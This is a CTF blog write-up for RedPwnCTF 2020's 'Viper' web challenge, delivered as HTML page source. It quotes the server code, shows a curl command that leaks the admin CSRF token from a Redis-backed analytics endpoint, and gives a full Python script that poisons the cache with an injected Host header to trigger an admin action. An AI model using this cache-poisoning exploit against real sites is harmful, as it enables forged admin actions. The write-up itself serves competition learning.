@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Jamie Polintan ">
+<meta name="description" content="Part 3 of my writeup series for RedPwnCTF 2020! This is the writeup for the web challenge known as &amp;ldquo;Viper&amp;rdquo;.
+Let&amp;rsquo;s Begin! Snakes are my favourite animal. And now, you can easily create ASCII-text snakes with the handy services provided by RedPwn:
+When we create our viper, its name is its viperId, which is a UUID.
+The source code is available for us in this challenge as well. The server&amp;rsquo;s file defines multiple endpoints, but the one that caught my eye immediately was GET /admin/create." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://jamvie.net/post/10redpwn2020_03/" />
+
+
+    <title>
+        
+            RedPwnCTF 2020 Part 3 :: Jam Polintan 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://jamvie.net/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://jamvie.net/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://jamvie.net/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://jamvie.net/favicon-16x16.png">
+    <link rel="manifest" href="https://jamvie.net/site.webmanifest">
+    <link rel="mask-icon" href="https://jamvie.net/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://jamvie.net/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="RedPwnCTF 2020 Part 3">
+<meta itemprop="description" content="Part 3 of my writeup series for RedPwnCTF 2020! This is the writeup for the web challenge known as &ldquo;Viper&rdquo;.
+Let&rsquo;s Begin! Snakes are my favourite animal. And now, you can easily create ASCII-text snakes with the handy services provided by RedPwn:
+When we create our viper, its name is its viperId, which is a UUID.
+The source code is available for us in this challenge as well. The server&rsquo;s file defines multiple endpoints, but the one that caught my eye immediately was GET /admin/create.">
+<meta itemprop="datePublished" content="2020-07-02T01:56:16-06:00" />
+<meta itemprop="dateModified" content="2020-07-02T01:56:16-06:00" />
+<meta itemprop="wordCount" content="1033">
+<meta itemprop="image" content="https://jamvie.net/images/REDPWN2020_ViperHome.png">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://jamvie.net/images/REDPWN2020_ViperHome.png"/>
+
+<meta name="twitter:title" content="RedPwnCTF 2020 Part 3"/>
+<meta name="twitter:description" content="Part 3 of my writeup series for RedPwnCTF 2020! This is the writeup for the web challenge known as &ldquo;Viper&rdquo;.
+Let&rsquo;s Begin! Snakes are my favourite animal. And now, you can easily create ASCII-text snakes with the handy services provided by RedPwn:
+When we create our viper, its name is its viperId, which is a UUID.
+The source code is available for us in this challenge as well. The server&rsquo;s file defines multiple endpoints, but the one that caught my eye immediately was GET /admin/create."/>
+
+
+
+    <meta property="og:title" content="RedPwnCTF 2020 Part 3" />
+<meta property="og:description" content="Part 3 of my writeup series for RedPwnCTF 2020! This is the writeup for the web challenge known as &ldquo;Viper&rdquo;.
+Let&rsquo;s Begin! Snakes are my favourite animal. And now, you can easily create ASCII-text snakes with the handy services provided by RedPwn:
+When we create our viper, its name is its viperId, which is a UUID.
+The source code is available for us in this challenge as well. The server&rsquo;s file defines multiple endpoints, but the one that caught my eye immediately was GET /admin/create." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jamvie.net/post/10redpwn2020_03/" />
+<meta property="og:image" content="https://jamvie.net/images/REDPWN2020_ViperHome.png" />
+<meta property="article:published_time" content="2020-07-02T01:56:16-06:00" />
+<meta property="article:modified_time" content="2020-07-02T01:56:16-06:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-07-02 01:56:16 -0600 MDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://jamvie.net/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ echo hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://jamvie.net/about/">About Me</a></li><li><a href="https://jamvie.net/post/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://jamvie.net/post/10redpwn2020_03/">RedPwnCTF 2020 Part 3</a></h2>
+
+            
+
+            <div class="post-content">
+                <p>Part 3 of my writeup series for RedPwnCTF 2020! This is the writeup for the web challenge known as &ldquo;Viper&rdquo;.</p>
+<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
+<p>Snakes are my favourite animal. And now, you can easily create ASCII-text snakes with the handy services provided by RedPwn:</p>
+
+    <img src="https://jamvie.net/images/REDPWN2020_ViperHome.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>When we create our viper, its name is its viperId, which is a UUID.</p>
+<p>The source code is available for us in this challenge as well. The server&rsquo;s file defines multiple endpoints, but the one that caught my eye immediately was <code>GET /admin/create</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin/create&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sess</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>;
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">viperId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">viperId</span>;
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">csrfToken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">csrfToken</span>;
+
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">v4regex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#e6db74">&#34;^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$&#34;</span>, <span style="color:#e6db74">&#34;i&#34;</span>);
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">viperId</span>.<span style="color:#a6e22e">match</span>(<span style="color:#a6e22e">v4regex</span>)){
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad request body&#34;</span>);
+        <span style="color:#66d9ef">return</span>;
+    }
+
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">viperId</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">csrfToken</span>){
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad request body&#34;</span>);
+        <span style="color:#66d9ef">return</span>;
+    }
+
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">isAdmin</span>){
+        <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">exists</span>(<span style="color:#e6db74">&#39;__csrftoken__&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
+            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
+                <span style="color:#66d9ef">return</span>;
+            }
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">reply</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
+                <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;__csrftoken__&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
+                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+                        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
+                        <span style="color:#66d9ef">return</span>;
+                    }
+                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">reply</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">csrfToken</span>, <span style="color:#e6db74">&#39;base64&#39;</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;ascii&#39;</span>)){
+                        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">randomToken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getRandomInt</span>(<span style="color:#ae81ff">1000000</span>, <span style="color:#ae81ff">10000000000</span>);
+                        <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;__csrftoken__&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span>, <span style="color:#a6e22e">randomToken</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
+                            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+                                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
+                                <span style="color:#66d9ef">return</span>;
+                            }
+                        });
+
+                        <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">viperId</span>;
+                        <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#39;./flag.txt&#39;</span>).<span style="color:#a6e22e">toString</span>();
+
+                        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/viper/&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span>));
+                    }<span style="color:#66d9ef">else</span>{
+                        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Unauthorized&#34;</span>);
+                    }
+                });
+            } <span style="color:#66d9ef">else</span> {
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Unauthorized&#34;</span>);
+            }
+        });
+    }<span style="color:#66d9ef">else</span>{
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+    }
+ });
+</code></pre></div><p>The endpoint takes a valid viperID and the admin&rsquo;s CSRF token and changes the viper&rsquo;s name to the contents of <code>flag.txt</code>. So, attempting to call or manipulate this endpoint seems like the way to solve this challenge.</p>
+<p>There also exists a report function, which hints at the possibility of an XSS or CSRF attack on the admin, which so far has occured in 3 of the 6 challenges I previously solved in RedPwnCTF 2020. Judging by the code above, we will most likely try to implement a CSRF attack.</p>
+<p>The admin&rsquo;s CSRF token is generated by a function known as <code>randomInt()</code>, which is called by the <code>/admin</code> endpoint:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getRandomInt</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">min</span>, <span style="color:#a6e22e">max</span>) =&gt; {
+    <span style="color:#a6e22e">min</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">ceil</span>(<span style="color:#a6e22e">min</span>);
+    <span style="color:#a6e22e">max</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">floor</span>(<span style="color:#a6e22e">max</span>);
+    <span style="color:#66d9ef">return</span> Math.<span style="color:#a6e22e">floor</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> (<span style="color:#a6e22e">max</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">min</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">+</span> <span style="color:#a6e22e">min</span>;
+ };
+
+ <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sess</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>;
+
+<span style="color:#75715e">/*Focusing only on the bit where the CSRF token is generated*/</span>
+(...)
+
+            } <span style="color:#66d9ef">else</span> {
+                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">randomToken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getRandomInt</span>(<span style="color:#ae81ff">10000</span>, <span style="color:#ae81ff">1000000000</span>);
+                <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;__csrftoken__&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span>, <span style="color:#a6e22e">randomToken</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
+                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+                        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
+                        <span style="color:#66d9ef">return</span>;
+                    }
+                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;pages/admin&#39;</span>, {
+                        <span style="color:#a6e22e">csrfToken</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">randomToken</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;base64&#39;</span>)
+                    });
+                });
+            }
+        });
+
+(...)
+</code></pre></div><p>For context, the variable <code>client</code> is defined as:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">client</span>  <span style="color:#f92672">=</span> <span style="color:#a6e22e">redis</span>.<span style="color:#a6e22e">createClient</span>(<span style="color:#e6db74">&#39;redis://redis:6379&#39;</span>);
+</code></pre></div><p>redis is an open-source data structure store that is used as a cache. The CSRF token is stored in the redis server.
+The <code>client.set()</code> function sets the cache&rsquo;s key. It&rsquo;s built by concatenating <code>'__csrftoken__'</code> with the <code>viperid</code>, which we find in the <code>admin/generate/:secrettoken</code> endpoint is <code>'admin_account'</code>. Therefore, the redis cache key to the admin&rsquo;s CSRF token is <code>'__csrftoken__admin_account'</code>.</p>
+<p>There is another endpoint I haven&rsquo;t mentioned yet that also utilizes the redis cache, known as <code>/analytics</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/analytics&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">ip_address</span>;
+
+(...)
+
+    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">exists</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">reply</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
+            <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">incr</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
+                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
+                    <span style="color:#66d9ef">return</span>;
+                }
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Success! &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; has visited the site &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">reply</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; times.&#34;</span>);
+            });
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
+                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
+                    <span style="color:#66d9ef">return</span>;
+                }
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Success! &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; has visited the site 1 time.&#34;</span>);
+            });
+        }
+    });
+ });
+</code></pre></div><p>The endpoint logs the amount of times the webpage&rsquo;s visitor&rsquo;s ip_address checked the page into the redis cache. Specifically, it sets the key of the data as our input to the ip_addressparam. We already know of an existing key and entry in the cache, the key to the admin&rsquo;s CSRF token (<code>'__csrftoken__admin_account'</code>). If we provided this as our input to the ip_address param, we should get the CSRF token (incremented by 1) in return.</p>
+<p>At this point, it&rsquo;s pretty obvious that our attack will have to do some cache-poisoning. I have only ever done one other challenge (expect a writeup soon) that involved cache poisoning so I certainly don&rsquo;t have much experience-based knowledge on it - so I had to some research into how cache-poisoning attacks work.</p>
+<p>Altogether, the attack plan is this:</p>
+<ol>
+<li>Grab the CSRF token.</li>
+<li>Create our viper page, but inject our own headers into it so that it will lead to the <code>admin/create</code> endpoint that will give us the flag.</li>
+<li>Cache our viper page with the injected headers, and then send the URL of our page to the admin.</li>
+<li>When the admin visits our page, the cached request that we injected with our headers will fire, and will change the name of the viper to that of the flag.</li>
+</ol>
+<h3 id="step-1-grab-the-csrf-token">Step 1: Grab the CSRF token.</h3>
+<p>As mentioned before, we can use the <code>/analytics</code> endpoint to grab the CSRF token utilizing <code>'__csrftoken__admin_account'</code> as our <code>ip_address</code> value.</p>
+<pre><code>curl http://2020.redpwnc.tf:31291/analytics?ip_address=__csrftoken__admin_account
+</code></pre>
+    <img src="https://jamvie.net/images/REDPWN2020_ViperCSRF.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We will use these commands in a script later to grab the CSRF token.</p>
+<h3 id="step-2-create-a-user-and-our-own-viper-page-and-then-inject-custom-headers-into-it">Step 2: Create a user and our own viper page, and then inject custom headers into it.</h3>
+<p>After we create it, we need to take note of the sessionid, cookies, and viperID for the URL that we send to the admin. When we inject the header, the request URL should be a GET request to <code>admin/create</code>.</p>
+<h3 id="step-3-cache-the-viper-page-we-created">Step 3: Cache the viper page we created.</h3>
+<p>Simple make a request for our page so it will be put into the redis cache.</p>
+<h3 id="step-4-send-our-viper-url-to-the-admin">Step 4: Send our viper URL to the admin!</h3>
+<p>Sending the page URL to the admin will hopefully activate the cache to retrieve the instance of our page with the injected payload into it. When we next refresh the page, the viper&rsquo;s name should be the flag!</p>
+<p>Here is my script for this challenge:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> socket<span style="color:#f92672">,</span> re
+<span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote
+<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64encode
+
+address <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://2020.redpwnc.tf:31291&#34;</span>
+
+ADMIN_VIPER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CAFECAFE-CAFE-4CAF-8CAF-CAFECAFECAFE&#34;</span>
+
+
+<span style="color:#75715e"># Create viper page</span>
+viper <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(address<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/create&#39;</span>, allow_redirects<span style="color:#f92672">=</span>False)
+viper_id <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})&#34;</span>, viper<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]
+session_id <span style="color:#f92672">=</span> viper<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#34;connect.sid&#34;</span>]
+cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;connect.sid&#34;</span> : session_id}
+
+
+<span style="color:#75715e"># Get csrf </span>
+viper <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(address<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/analytics?ip_address=__csrftoken__admin_account&#34;</span>)
+csrf <span style="color:#f92672">=</span> quote(b64encode(viper<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>encode()))
+
+<span style="color:#75715e"># Inject host header</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;GET /viper/&#34;</span><span style="color:#f92672">+</span>viper_id<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Host: 2020.redpwnc.tf:31291</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">admin</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">create?x=&lt;!--&amp;viperId=&#34;</span><span style="color:#f92672">+</span>ADMIN_VIPER<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&amp;csrfToken=&#34;</span><span style="color:#f92672">+</span>csrf<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;#--&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Accept: */*</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Cookie: connect.sid=&#34;</span><span style="color:#f92672">+</span>session_id<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>
+
+poison <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket()
+poison<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;2020.redpwnc.tf&#34;</span>, <span style="color:#ae81ff">31291</span>))
+poison<span style="color:#f92672">.</span>sendall(payload<span style="color:#f92672">.</span>encode())
+poison<span style="color:#f92672">.</span>close()
+
+<span style="color:#75715e"># Cache Page</span>
+viper <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://2020.redpwnc.tf:31291/viper/&#34;</span><span style="color:#f92672">+</span>viper_id, cookies<span style="color:#f92672">=</span>cookies)
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;URL to admin:&#34;</span>)
+<span style="color:#66d9ef">print</span>(address<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/viper/&#34;</span><span style="color:#f92672">+</span>viper_id)
+
+
+
+input(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> fetching... </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> press ENTER to load cached page, once the admin has visited the URL.&#34;</span>)
+viper <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://2020.redpwnc.tf:31291/viper/&#34;</span><span style="color:#f92672">+</span>ADMIN_VIPER, cookies<span style="color:#f92672">=</span>cookies)
+<span style="color:#66d9ef">print</span>(viper<span style="color:#f92672">.</span>text)
+
+</code></pre></div>
+    <img src="https://jamvie.net/images/REDPWN2020_ViperFlag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Jam</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="https://jamvie.net">Jamie Polintan</a></span>
+            
+            <span>CC Attribution-NonCommercial 4.0 International License</span>
+            <span> <a href="https://jamvie.net/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://jamvie.net/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
